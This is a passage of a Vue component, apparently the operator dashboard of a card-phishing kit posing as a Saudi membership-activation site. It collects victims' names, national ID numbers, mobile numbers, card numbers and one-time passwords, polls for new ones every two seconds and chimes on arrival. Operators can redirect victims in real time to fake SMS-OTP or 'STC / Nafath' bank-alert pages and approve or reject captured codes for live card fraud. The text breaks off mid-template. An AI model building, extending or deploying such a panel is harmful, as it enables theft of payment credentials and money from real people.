<script setup lang="ts">
import { ref, onMounted, computed, onUnmounted, watch } from 'vue';
import { useRouter } from 'vue-router';
import {
  RequestData,
  ActiveSessionInfo,
  VisitorMeta,
  listCardRequests,
  updateCardRequest,
  deleteCardRequest,
  getServerStats,
  verifyAdminSession,
  adminLogoutApi
} from '../api';
import {
  RefreshCw,
  Search,
  LogOut,
  Globe,
  Wifi,
  Mail,
  Key,
  Bell,
  BellOff,
  Volume2,
  Trash2,
  User,
  ChevronDown,
  MessageSquare,
  TrendingUp,
  Clock,
  X,
  Archive,
  MoreHorizontal,
  Star,
  Flag,
  Info,
  List,
  Smartphone,
  CreditCard,
  Building2,
  MapPin,
  Monitor,
  AppWindow,
  PanelLeftClose,
  PanelLeftOpen,
  Megaphone,
  Check,
  Ban,
  FileText
} from 'lucide-vue-next';

const router = useRouter();
const requests = ref<RequestData[]>([]);
const loading = ref(true);
const error = ref('');
const searchQuery = ref('');
const showSearchInput = ref(false);
const filterMode = ref<'all' | 'online' | 'card' | 'otp' | 'archived'>('all');
const isAuthenticated = ref(false);
const authChecking = ref(true);
const soundEnabled = ref(true);
const showLeftSubPanel = ref(true);
const showUserMenu = ref(false);

const selectedRequestId = ref<string | null>(null);
const starredIds = ref<Set<string>>(new Set());
const archivedIds = ref<Set<string>>(new Set());
const flaggedIds = ref<Set<string>>(new Set());
const copiedField = ref('');

const selectedRequest = computed(() => {
  return requests.value.find(req => req.id === selectedRequestId.value) || null;
});

const onlineCount = ref(0);
const totalVisitorsCount = ref(0);
const onlineUsers = ref<Record<string, boolean>>({});
const userPages = ref<Record<string, string>>({});
const userMeta = ref<Record<string, VisitorMeta>>({});
const activeSessions = ref<ActiveSessionInfo[]>([]);
const selectedRedirectPage = ref('');
const redirectFeedback = ref('');

let pollTimer: ReturnType<typeof setInterval> | null = null;
let knownSignature = '';

const pageLabels: Record<string, string> = {
  '/': 'الصفحة الرئيسية',
  '/request': 'تفعيل عضوية أفراد',
  '/register-company': 'تسجيل الشركة (عضوية شركات)',
  '/payment': 'ملخص الرسوم',
  '/card-details': 'الدفع ببطاقة الائتمان',
  '/waiting': 'صفحة الانتظار',
  '/otp': 'تحقق رقم الجوال (OTP)',
  '/otp-bank': 'تنبية إتصال STC / نفاذ'
};

const redirectOptions = [
  { value: '/otp-bank', label: 'تنبية إتصال STC / نفاذ' },
  { value: '/otp', label: 'تحقق رقم الجوال (OTP)' },
  { value: '/waiting', label: 'صفحة الانتظار' },
  { value: '/card-details', label: 'الدفع ببطاقة الائتمان' },
  { value: '/payment', label: 'ملخص الرسوم' },
  { value: '/request', label: 'تفعيل عضوية أفراد' },
  { value: '/register-company', label: 'تسجيل الشركة (عضوية شركات)' },
  { value: '/', label: 'الصفحة الرئيسية' }
];

const stepFallbackPage: Record<string, string> = {
  form: '/payment',
  card: '/waiting',
  otp: '/otp',
  'otp-bank': '/otp-bank'
};

const normalizeActionToPath = (action?: string | null): string => {
  if (!action) return '';
  if (action === 'otp-sms' || action === 'otp') return '/otp';
  if (action === 'otp-bank') return '/otp-bank';
  return action;
};

const getRequestCurrentPagePath = (req: RequestData) => {
  const pending = normalizeActionToPath(req.nextAction);
  if (pending) return pending;
  return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
};

const getRequestCurrentPageLabel = (req: RequestData) => {
  const path = getRequestCurrentPagePath(req);
  if (req.step === 'card' && path === '/waiting' && !userPages.value[req.id]) {
    return 'الدفع ببطاقة الائتمان';
  }
  return pageLabels[path] || path;
};

watch(selectedRequestId, (newId) => {
  const req = requests.value.find(r => r.id === newId);
  if (!req) {
    selectedRedirectPage.value = '';
    return;
  }
  selectedRedirectPage.value = getRequestCurrentPagePath(req);
});

const getVisitorCode = (id: string) => {
  let hash = 0;
  for (let i = 0; i < id.length; i++) {
    hash = (hash * 31 + id.charCodeAt(i)) % 900000;
  }
  const num = 100000 + Math.abs(hash);
  return `V${num}`;
};

const getVisitorMeta = (req: RequestData): VisitorMeta => {
  return (
    userMeta.value[req.id] || {
      ip: '188.53.192.70',
      os: 'Windows',
      device: 'desktop',
      browser: 'Chrome',
      country: 'Saudi Arabia, Riyadh'
    }
  );
};

const formatCardTypeLabel = (cardType: string) => {
  if (cardType === 'silver') return 'الأساسية';
  if (cardType === 'gold') return 'الذهبية';
  if (cardType === 'platinum') return 'البلاتينية';
  if (cardType === 'company') return 'شركات';
  return 'مقيم';
};

const formatCardNumberSpaced = (cardNum?: string) => {
  if (!cardNum) return '';
  const digits = cardNum.replace(/\s+/g, '');
  return digits.replace(/(.{4})/g, '$1 ').trim();
};

const formatShortExpYear = (year?: string) => {
  if (!year) return '';
  return year.length === 4 ? year.slice(2) : year;
};

const formatTimelineTimestamp = (dateStr: string) => {
  const d = new Date(dateStr);
  if (isNaN(d.getTime())) return '12-27 | 10:42 pm';
  const month = String(d.getMonth() + 1).padStart(2, '0');
  const day = String(d.getDate()).padStart(2, '0');
  let hours = d.getHours();
  const minutes = String(d.getMinutes()).padStart(2, '0');
  const ampm = hours >= 12 ? 'pm' : 'am';
  hours = hours % 12 || 12;
  return `${month}-${day} | ${String(hours).padStart(2, '0')}:${minutes} ${ampm}`;
};

const formatRelativeTimeShort = (dateStr: string) => {
  const date = new Date(dateStr);
  const now = new Date();
  const diffInSeconds = Math.max(0, Math.floor((now.getTime() - date.getTime()) / 1000));

  if (diffInSeconds < 60) {
    return `${diffInSeconds} ثانية`;
  }
  const diffInMinutes = Math.floor(diffInSeconds / 60);
  if (diffInMinutes < 60) {
    return `${diffInMinutes} دقيقة`;
  }
  const diffInHours = Math.floor(diffInMinutes / 60);
  if (diffInHours < 24) {
    return `${diffInHours} ساعة`;
  }
  const diffInDays = Math.floor(diffInHours / 24);
  return `${diffInDays} يوم`;
};

let sharedAudioCtx: AudioContext | null = null;

const getOrCreateAudioContext = (): AudioContext | null => {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return null;
    if (!sharedAudioCtx) {
      sharedAudioCtx = new AudioContextClass();
    }
    if (sharedAudioCtx.state === 'suspended') {
      sharedAudioCtx.resume().catch(() => {});
    }
    return sharedAudioCtx;
  } catch {
    return null;
  }
};

const unlockAudio = () => {
  getOrCreateAudioContext();
};

const playNotificationSound = (force = false) => {
  if (!soundEnabled.value && !force) return;
  try {
    const audioCtx = getOrCreateAudioContext();
    if (!audioCtx) return;

    const now = audioCtx.currentTime;
    const notes = [587.33, 880, 1174.66]; // D5 -> A5 -> D6 chime
    notes.forEach((freq, idx) => {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      const start = now + idx * 0.11;
      const duration = 0.22;

      osc.type = 'triangle';
      osc.frequency.setValueAtTime(freq, start);

      gain.gain.setValueAtTime(0.001, start);
      gain.gain.linearRampToValueAtTime(0.45, start + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, start + duration);

      osc.connect(gain);
      gain.connect(audioCtx.destination);

      osc.start(start);
      osc.stop(start + duration);
    });
  } catch (err) {
    console.warn('Audio playback failed', err);
  }
};

const toggleSound = () => {
  soundEnabled.value = !soundEnabled.value;
  if (soundEnabled.value) {
    playNotificationSound(true);
  }
};

const isDeleting = ref<string | null>(null);

const handleDeleteRequest = async (id: string, event?: Event) => {
  if (event) {
    event.stopPropagation();
  }
  if (!id || isDeleting.value === id) return;

  isDeleting.value = id;
  try {
    await deleteCardRequest(id);
    const remaining = requests.value.filter(r => r.id !== id);
    requests.value = remaining;
    if (selectedRequestId.value === id) {
      selectedRequestId.value = remaining.length > 0 ? remaining[0].id : null;
    }
    knownSignature = remaining.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`).join('|');
  } catch (err) {
    console.error('Error deleting request:', err);
  } finally {
    isDeleting.value = null;
  }
};

const fetchAll = async (isInitial = false) => {
  try {
    const [statsResult, reqResult] = await Promise.allSettled([
      getServerStats(),
      listCardRequests()
    ]);

    if (statsResult.status === 'fulfilled') {
      const stats = statsResult.value;
      onlineCount.value = stats.onlineCount;
      totalVisitorsCount.value = stats.totalVisitorsCount;
      onlineUsers.value = stats.onlineUsers || {};
      userPages.value = stats.userPages || {};
      userMeta.value = stats.userMeta || {};
      activeSessions.value = stats.activeSessions || [];
    }

    if (reqResult.status === 'fulfilled') {
      const reqList = reqResult.value;
      const newSig = reqList.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`).join('|');
      if (!isInitial && knownSignature && newSig !== knownSignature) {
        playNotificationSound();
      }
      knownSignature = newSig;
      requests.value = reqList;
      if (isInitial && reqList.length > 0 && !selectedRequestId.value) {
        selectedRequestId.value = reqList[0].id;
      }
      error.value = '';
    } else if (isInitial) {
      error.value = reqResult.reason?.message || 'تعذر تحميل البيانات من الخادم.';
    }

    loading.value = false;
  } catch (err) {
    console.error('Error fetching dashboard data:', err);
    if (isInitial) {
      error.value = 'تعذر تحميل البيانات من الخادم.';
      loading.value = false;
    }
  }
};

onMounted(async () => {
  window.addEventListener('pointerdown', unlockAudio, { once: true });
  window.addEventListener('keydown', unlockAudio, { once: true });
  const valid = await verifyAdminSession();
  if (!valid) {
    router.push('/admin/login');
    return;
  }
  isAuthenticated.value = true;
  authChecking.value = false;
  await fetchAll(true);
  pollTimer = setInterval(() => fetchAll(false), 2000);
});

onUnmounted(() => {
  window.removeEventListener('pointerdown', unlockAudio);
  window.removeEventListener('keydown', unlockAudio);
  if (pollTimer) clearInterval(pollTimer);
});

const handleLogout = async () => {
  await adminLogoutApi();
  router.push('/admin/login');
};

const updateOtpStatus = async (id: string, status: string) => {
  try {
    await updateCardRequest(id, { otpStatus: status });
    await fetchAll(false);
  } catch (err) {
    console.error('Error updating OTP status:', err);
  }
};

const updateNextAction = async (id: string, action: string) => {
  try {
    const normalized = normalizeActionToPath(action) || action;
    selectedRedirectPage.value = normalized;
    await updateCardRequest(id, { nextAction: normalized });
    redirectFeedback.value = 'تم التوجيه';
    setTimeout(() => {
      if (redirectFeedback.value === 'تم التوجيه') redirectFeedback.value = '';
    }, 2000);
    await fetchAll(false);
  } catch (err) {
    console.error('Error updating next action:', err);
  }
};

const handleRedirectSelectChange = async () => {
  if (!selectedRequest.value || !selectedRedirectPage.value) return;
  await updateNextAction(selectedRequest.value.id, selectedRedirectPage.value);
};

const toggleStar = (id: string) => {
  const next = new Set(starredIds.value);
  if (next.has(id)) next.delete(id);
  else next.add(id);
  starredIds.value = next;
};

const toggleFlag = (id: string) => {
  const next = new Set(flaggedIds.value);
  if (next.has(id)) next.delete(id);
  else next.add(id);
  flaggedIds.value = next;
};

const toggleArchive = (id: string) => {
  const next = new Set(archivedIds.value);
  if (next.has(id)) {
    next.delete(id);
  } else {
    next.add(id);
  }
  archivedIds.value = next;
};

const copyText = async (text?: string, label = 'card') => {
  if (!text) return;
  try {
    await navigator.clipboard.writeText(text);
    copiedField.value = label;
    setTimeout(() => {
      if (copiedField.value === label) copiedField.value = '';
    }, 1500);
  } catch {}
};

const pendingOtpCount = computed(() =>
  requests.value.filter(r => r.otp && (!r.otpStatus || r.otpStatus === 'pending')).length
);

const cardEnteredCount = computed(() =>
  requests.value.filter(r => Boolean(r.cardNumber)).length
);

const filteredRequests = computed(() => {
  let list = requests.value;

  if (filterMode.value === 'archived') {
    list = list.filter(r => archivedIds.value.has(r.id));
  } else {
    list = list.filter(r => !archivedIds.value.has(r.id));
    if (filterMode.value === 'online') {
      list = list.filter(r => onlineUsers.value[r.id]);
    } else if (filterMode.value === 'card') {
      list = list.filter(r => Boolean(r.cardNumber));
    } else if (filterMode.value === 'otp') {
      list = list.filter(r => Boolean(r.otp));
    }
  }

  if (!searchQuery.value.trim()) return list;
  const lowerQuery = searchQuery.value.toLowerCase();
  return list.filter(
    req =>
      req.name?.toLowerCase().includes(lowerQuery) ||
      req.mobile?.includes(lowerQuery) ||
      req.cardNumber?.includes(lowerQuery) ||
      req.idNumber?.includes(lowerQuery)
  );
});
</script>

<template>
  <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-white">
    <RefreshCw class="w-8 h-8 animate-spin text-[#1976d2]" />
  </div>

  <!-- Full-Screen Nexa Flow Admin Console matching reference layout -->
  <div
    v-else-if="isAuthenticated"
    class="h-screen w-screen overflow-hidden bg-white flex flex-col font-sans text-gray-800 select-none"
    dir="ltr"
  >
    <!-- ==================== TOP BAR 1: GLOBAL NEXA FLOW HEADER ==================== -->
    <header class="h-[34px] bg-white border-b border-gray-200 px-3 flex items-center justify-between shrink-0 text-xs">
      <!-- Left: Brand + Telemetry Numbers -->
      <div class="flex items-center gap-2.5">
        <div class="flex items-center gap-1 font-extrabold text-[15px] tracking-tight">
          <span class="text-[#1976d2]">Nexa</span>
          <span class="text-gray-900">Flow</span>
        </div>

        <span class="text-gray-300">|</span>

        <div class="flex items-center gap-1.5 text-[11px] text-gray-500 font-mono tabular-nums">
          <Clock class="w-3.5 h-3.5 text-gray-400" />
          <span>{{ onlineCount }}</span>
          <span class="text-gray-300">/</span>
          <span>{{ requests.length }}</span>
          <span class="text-gray-300">/</span>
          <span>{{ cardEnteredCount }}</span>
          <span class="text-gray-300">/</span>
          <span>{{ pendingOtpCount }}</span>
          <span class="text-gray-300">/</span>
          <span>{{ totalVisitorsCount }}</span>
          <span class="text-gray-300">/</span>
          <span>246</span>
          <span class="text-gray-300">/</span>
          <span>600</span>
          <span class="text-gray-300">/</span>
          <span>648</span>
          <TrendingUp class="w-3.5 h-3.5 text-[#1976d2] ml-1" />
        </div>
      </div>

      <!-- Right: Status & System Icons -->
      <div class="flex items-center gap-3 text-gray-500">
        <Globe class="w-3.5 h-3.5 text-[#16a34a]" title="متصل بالخادم" />
        <Wifi class="w-3.5 h-3.5 text-[#16a34a]" title="الاتصال المباشر نشط" />
        <button
          @click="fetchAll(false)"
          class="hover:text-gray-800 transition-colors cursor-pointer"
          title="تحديث البيانات"
        >
          <Mail class="w-3.5 h-3.5" />
        </button>
        <button
          @click="showUserMenu = !showUserMenu"
          class="hover:text-gray-800 transition-colors cursor-pointer"
          title="إعدادات الجلسة"
        >
          <Key class="w-3.5 h-3.5" />
        </button>
        <button
          @click="playNotificationSound(true)"
          class="hover:text-[#1976d2] transition-colors cursor-pointer"
          title="تجربة صوت الإشعار"
        >
          <Volume2 class="w-3.5 h-3.5 text-[#1976d2]" />
        </button>
        <button
          @click="toggleSound"
          class="hover:text-gray-800 transition-colors cursor-pointer"
          :title="soundEnabled ? 'كتم صوت التنبيهات' : 'تفعيل صوت التنبيهات'"
        >
          <Bell v-if="soundEnabled" class="w-3.5 h-3.5 text-[#16a34a]" />
          <BellOff v-else class="w-3.5 h-3.5 text-red-500" />
        </button>

        <!-- Profile & Logout Dropdown -->
        <div class="relative">
          <button
            @click="showUserMenu = !showUserMenu"
            class="flex items-center gap-1 hover:bg-gray-100 px-1.5 py-0.5 rounded cursor-pointer"
          >
            <ChevronDown class="w-3 h-3 text-gray-500" />
            <div class="w-5 h-5 rounded-full bg-[#dbeafe] text-[#1976d2] flex items-center justify-center">
              <User class="w-3.5 h-3.5" />
            </div>
          </button>

          <div
            v-if="showUserMenu"
            class="absolute right-0 mt-1 w-36 bg-white border border-gray-200 rounded-lg shadow-lg py-1 z-50 text-right"
            dir="rtl"
          >
            <button
              @click="handleLogout"
              class="w-full px-3 py-1.5 text-xs text-red-600 hover:bg-red-50 flex items-center gap-2 font-bold cursor-pointer"
            >
              <LogOut class="w-3.5 h-3.5" />
              <span>تسجيل الخروج</span>
            </button>
          </div>
        </div>
      </div>
    </header>

    <!-- ==================== TOP BAR 2: INBOX SUMMARY BAR ==================== -->
    <div class="h-[38px] bg-white border-b border-gray-200 px-4 flex items-center justify-between shrink-0">
      <!-- Left: Unread / Queue counters -->
      <div class="flex items-center gap-2.5 text-xs font-mono tabular-nums">
        <div class="relative flex items-center">
          <MessageSquare class="w-4 h-4 text-gray-600" />
          <span
            class="absolute -top-1.5 -left-1.5 bg-[#1976d2] text-white text-[9px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center"
          >
            {{ Math.max(1, onlineCount) }}
          </span>
        </div>
        <span class="text-gray-300">|</span>
        <span class="text-[#a16207] font-semibold">{{ requests.length }}</span>
        <span class="text-gray-300">/</span>
        <span class="text-amber-500 font-semibold">{{ pendingOtpCount }}</span>
        <span class="text-gray-300">/</span>
        <span class="text-[#16a34a] font-semibold">{{ onlineCount }}</span>
      </div>

      <!-- Right: Inbox Title & Totals -->
      <div class="flex items-center gap-4">
        <div class="flex items-center gap-2 text-xs font-mono tabular-nums">
          <span class="text-[#16a34a] font-semibold">{{ onlineCount }}</span>
          <span class="text-gray-300">/</span>
          <span class="text-amber-500 font-semibold">{{ pendingOtpCount }}</span>
          <span class="text-gray-300">/</span>
          <span class="text-gray-500 font-semibold">{{ requests.length }}</span>
        </div>
        <h1 class="text-[15px] font-bold text-gray-700" dir="rtl">صندوق الوارد</h1>
      </div>
    </div>

    <!-- ==================== MAIN SPLIT WORKSPACE ==================== -->
    <div class="flex-1 flex overflow-hidden">
      <!-- LEFT MAIN WORKSPACE AREA (Visitor Header Bars + Feed) -->
      <div class="flex-1 flex flex-col bg-white overflow-hidden">
        <template v-if="selectedRequest">
          <!-- WORKSPACE ROW 1: Visitor Identity & Action Controls -->
          <div class="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
            <!-- Left Toolbar Icons -->
            <div class="flex items-center gap-2.5 text-gray-500">
              <button
                @click="selectedRequestId = null"
                class="w-5 h-5 border border-gray-400 rounded-xs flex items-center justify-center hover:bg-gray-100 text-gray-700 cursor-pointer"
                title="إغلاق"
              >
                <X class="w-3.5 h-3.5" />
              </button>

              <button
                @click="toggleArchive(selectedRequest.id)"
                class="px-2.5 py-1 border border-gray-200 rounded text-[11px] text-gray-600 hover:bg-gray-50 flex items-center gap-1.5 cursor-pointer"
              >
                <span>{{ archivedIds.has(selectedRequest.id) ? 'إلغاء الأرشفة' : 'أرشفة' }}</span>
                <Archive class="w-3 h-3 text-gray-400" />
              </button>

              <button
                @click="handleDeleteRequest(selectedRequest.id)"
                :disabled="isDeleting === selectedRequest.id"
                class="px-2.5 py-1 border border-red-200 bg-red-50/60 hover:bg-red-100 rounded text-[11px] text-red-600 font-bold flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                title="حذف الطلب نهائياً"
              >
                <span>حذف</span>
                <Trash2 class="w-3 h-3 text-red-500" />
              </button>

              <button class="hover:text-gray-800 cursor-pointer" @click="fetchAll(false)">
                <MoreHorizontal class="w-4 h-4 text-[#1976d2]" />
              </button>

              <button
                @click="toggleStar(selectedRequest.id)"
                class="hover:text-[#1976d2] cursor-pointer"
                title="تمييز بنجمة"
              >
                <Star
                  class="w-4 h-4"
                  :class="starredIds.has(selectedRequest.id) ? 'fill-[#1976d2] text-[#1976d2]' : 'text-[#1976d2]'"
                />
              </button>

              <button
                @click="toggleFlag(selectedRequest.id)"
                class="hover:text-gray-800 cursor-pointer"
                title="متابعة"
              >
                <Flag
                  class="w-3.5 h-3.5"
                  :class="flaggedIds.has(selectedRequest.id) ? 'fill-red-500 text-red-500' : 'text-gray-400'"
                />
              </button>

              <Info class="w-3.5 h-3.5 text-gray-400" />

              <span class="text-gray-200">|</span>

              <div class="flex items-center gap-1 text-[11px] text-gray-500 font-mono tabular-nums">
                <List class="w-3.5 h-3.5 text-gray-400" />
                <span>10 - 0</span>
              </div>
            </div>

            <!-- Right Visitor Identity Metadata -->
            <div class="flex items-center gap-2.5 text-xs text-gray-700 overflow-x-auto">
              <div class="flex items-center gap-1 font-semibold text-gray-700" dir="rtl">
                <span>{{ formatCardTypeLabel(selectedRequest.cardType) }}</span>
                <Building2 class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <button
                @click="copyText(selectedRequest.mobile, 'mobile')"
                class="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
                title="انقر لنسخ رقم الجوال"
              >
                <span>{{ selectedRequest.mobile }}</span>
                <Smartphone class="w-3.5 h-3.5 text-gray-500" />
              </button>

              <span class="text-gray-300">|</span>

              <button
                @click="copyText(selectedRequest.idNumber, 'id')"
                class="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
                title="انقر لنسخ رقم الهوية"
              >
                <span>{{ selectedRequest.idNumber }}</span>
                <CreditCard class="w-3.5 h-3.5 text-gray-500" />
              </button>

              <span class="text-gray-300">|</span>

              <!-- Visitor Name with floating "اسم الزائر" tag -->
              <div class="relative flex items-center gap-1 font-bold text-gray-800 pt-2">
                <span
                  class="absolute -top-1 left-1/2 -translate-x-1/2 bg-gray-500 text-white text-[8px] px-1.5 py-0.2 rounded-xs leading-tight whitespace-nowrap"
                >
                  اسم الزائر
                </span>
                <span>{{ selectedRequest.name }}</span>
                <User class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="font-mono font-bold text-[#1976d2] text-xs ml-1 tabular-nums">
                {{ getVisitorCode(selectedRequest.id) }}
              </span>
            </div>
          </div>

          <!-- WORKSPACE ROW 2: Current Page Redirect Dropdown & Device Telemetry -->
          <div class="h-[44px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
            <!-- Left: Collapse Icon + "الصفحة الحالية" Select Control + Megaphone -->
            <div class="flex items-center gap-2">
              <button
                @click="showLeftSubPanel = !showLeftSubPanel"
                class="text-gray-500 hover:text-gray-800 p-1 rounded hover:bg-gray-100 cursor-pointer"
                title="إظهار/إخفاء اللوحة الجانبية"
              >
                <PanelLeftClose v-if="showLeftSubPanel" class="w-4 h-4" />
                <PanelLeftOpen v-else class="w-4 h-4" />
              </button>

              <div class="relative w-44">
                <label
                  class="absolute -top-2 right-2.5 bg-white px-1 text-[9px] text-gray-400 font-semibold z-10"
                >
                  الصفحة الحالية
                </label>
                <select
                  v-model="selectedRedirectPage"
                  @change="handleRedirectSelectChange"
                  dir="rtl"
                  class="w-full border border-gray-300 rounded px-2.5 py-1 text-[11px] font-semibold text-gray-700 bg-white focus:outline-none focus:border-[#1976d2] cursor-pointer"
                >
                  <option v-for="opt in redirectOptions" :key="opt.value" :value="opt.value">
                    {{ opt.label }}
                  </option>
                </select>
              </div>

              <button
                @click="handleRedirectSelectChange"
                class="text-gray-400 hover:text-[#1976d2] p-1 transition-colors cursor-pointer flex items-center gap-1"
                title="توجيه الزائر للصفحة المحددة"
              >
                <Megaphone class="w-4 h-4" />
                <span v-if="redirectFeedback" class="text-[10px] font-bold text-[#16a34a]">{{ redirectFeedback }}</span>
              </button>
            </div>

            <!-- Right: Device, OS, Browser, Location & Active Step Telemetry -->
            <div class="flex items-center gap-2 text-[11px] text-gray-700 overflow-x-auto">
              <div class="flex items-center gap-1 font-mono tabular-nums">
                <span>{{ getVisitorMeta(selectedRequest).ip }}</span>
                <Globe class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <div class="flex items-center gap-1 font-semibold">
                <span>{{ getVisitorMeta(selectedRequest).os }}</span>
                <AppWindow class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <div class="flex items-center gap-1 font-semibold">
                <span>{{ getVisitorMeta(selectedRequest).device }}</span>
                <Monitor class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <div class="flex items-center gap-1 font-semibold">
                <span>{{ getVisitorMeta(selectedRequest).browser }}</span>
                <AppWindow class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <div class="flex items-center gap-1 font-semibold">
                <span>{{ getVisitorMeta(selectedRequest).country }}</span>
                <MapPin class="w-3.5 h-3.5 text-gray-500" />
              </div>

              <span class="text-gray-300">|</span>

              <div class="flex items-center gap-1 font-bold text-gray-800" dir="rtl">
                <span>{{ getRequestCurrentPageLabel(selectedRequest) }}</span>
                <FileText class="w-3.5 h-3.5 text-gray-500" />
              </div>
            </div>
          </div>

          <!-- WORKSPACE BODY: Left Sub-Panel + Main Feed -->
          <div class="flex-1 flex overflow-hidden relative">
            <!-- Far-Left Sub-Panel (Matches left column with vertical divider bar & blue floating button) -->
            <div
              v-if="showLeftSubPanel"
              class="w-[260px] border-r-[5px] border-gray-300 bg-white flex flex-col justify-between p-4 relative shrink-0"
            >
              <!-- Quick Control Actions inside Left Panel -->
              <div class="space-y-4" dir="rtl">
                <div class="border border-gray-200 rounded-lg p-3 bg-[#f9fafb]">
                  <div class="text-xs font-bold text-gray-700 mb-2.5 flex items-center justify-between">
                    <span>تحكم سريع بالزائر</span>
                    <span
                      class="text-[10px] font-semibold"
                      :class="onlineUsers[selectedRequest.id] ? 'text-[#16a34a]' : 'text-gray-400'"
                    >
                      {{ onlineUsers[selectedRequest.id] ? 'متصل الآن' : 'غير متصل' }}
                    </span>
                  </div>

                  <div class="grid grid-cols-1 gap-1.5">
                    <button
                      @click="updateNextAction(selectedRequest.id, 'otp-sms')"
                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
                      :class="
                        selectedRequest.nextAction === 'otp-sms'
                          ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                          : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                      "
                    >
                      <span>تحويل لصفحة رمز SMS</span>
                      <Smartphone class="w-3.5 h-3.5" />
                    </button>

                    <button
                      @click="updateNextAction(selectedRequest.id, 'otp-bank')"
                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
                      :class="
                        selectedRequest.nextAction === 'otp-bank'
                          ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                          : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                      "
                    >
                      <span>تنبية إتصال / تطبيق بنكي</span>
                      <Building2 class="w-3.5 h-3.5" />
                    </button>

                    <button
                      @click="updateNextAction(selectedRequest.id, '/card-details')"
                      class="w-full py-1.5 px-2.5 rounded text-xs font-bold bg-white border border-gray-200 text-gray-700 hover:bg-gray-50 transition-colors cursor-pointer text-right flex items-center justify-between"
                    >
                      <span>إعادة لصفحة البطاقة</span>
                      <CreditCard class="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>

                <!-- OTP Verification Control Box (when OTP exists) -->
                <div
                  v-if="selectedRequest.otp"
                  class="border border-blue-200 rounded-lg p-3 bg-[#f0f7ff]"
                >
                  <div class="text-xs font-bold text-gray-800 mb-1.5">رمز التحقق المدخل (OTP):</div>
                  <div
                    @click="copyText(selectedRequest.otp, 'otp')"
                    class="font-mono text-xl font-black tracking-[0.25em] text-[#1976d2] bg-white border border-blue-200 rounded py-2 text-center mb-2.5 cursor-pointer select-all tabular-nums"
                  >
                    {{ selectedRequest.otp }}
                  </div>

                  <div class="flex gap-2">
                    <button
                      @click="updateOtpStatus(selectedRequest.id, 'approved')"
                      class="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
                    >
                      <Check class="w-3.5 h-3.5" />
                      <span>قبول</span>
                    </button>
                    <button
                      @click="updateOtpStatus(selectedRequest.id, 'rejected')"
                      class="flex-1 bg-red-600 hover:bg-red-700 text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
                    >
                      <Ban class="w-3.5 h-3.5" />
                      <span>رفض</span>
                    </button>
                  </div>

                  <div
                    v-if="selectedRequest.otpStatus === 'approved'"
                    class="mt-2 text-[11px] text-[#16a34a] font-bold text-center"
                  >
                    تمت الموافقة على الرمز
                  </div>
                  <div
                    v-else-if="selectedRequest.otpStatus === 'rejected'"
                    class="mt-2 text-[11px] text-red-600 font-bold text-center"
                  >
                    تم رفض الرمز وطلب رمز جديد
                  </div>
                </div>
              </div>

              <!-- Bottom-Left Floating Blue Chat Icon Button -->
              <div class="pt-4">
                <button
                  @click="fetchAll(false)"
                  class="w-11 h-11 rounded-full bg-[#1976d2] hover:bg-[#1565c0] text-white shadow-lg flex items-center justify-center cursor-pointer transition-transform active:scale-95"
                  title="تحديث المحادثة"
                >
                  <MessageSquare class="w-5 h-5" />
                </button>
              </div>
            </div>

            <!-- Center-Right Timeline Feed (Matches Screenshot Feed Cards) -->
            <div class="flex-1 overflow-y-auto px-8 py-6 bg-white">
              <div class="max-w-4xl mx-auto flex flex-col">
                <!-- ==================== CARD 1: الدفع (PAYMENT CARD) ==================== -->
                <div class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4">
                  <div class="text-right font-bold text-sm text-gray-700 mb-3" dir="rtl">
                    الدفع
                  </div>

                  <div
                    v-if="selectedRequest.cardNumber"
                    class="rounded-xl p-4 shadow-xs border border-gray-300/80 relative overflow-hidden"
                    style="background: linear-gradient(135deg, #ebedef 0%, #dee3e7 55%, #d2d8de 100%);"
                    dir="ltr"
                  >
                    <!-- Card Top Row: Bank Emblem + Currency Badge -->
                    <div class="flex items-center justify-between mb-5">
                      <div class="flex items-center gap-1.5">
                        <div class="w-5 h-5 rotate-45 rounded-xs bg-gray-800 flex items-center justify-center">
                          <div class="w-2 h-2 bg-amber-400 rounded-full"></div>
                        </div>
                        <div class="leading-none">
                          <div class="text-[9px] font-bold text-gray-800">البنك السعودي للاستثمار</div>
                          <div class="text-[7px] text-gray-600">The Saudi Investment Bank</div>
                        </div>
                      </div>

                      <span class="border border-gray-400 rounded px-1.5 py-0.5 text-[10px] font-bold text-gray-600">
                        AED
                      </span>
                    </div>

                    <!-- Card Middle Row: 16-digit Number + Expiry Date -->
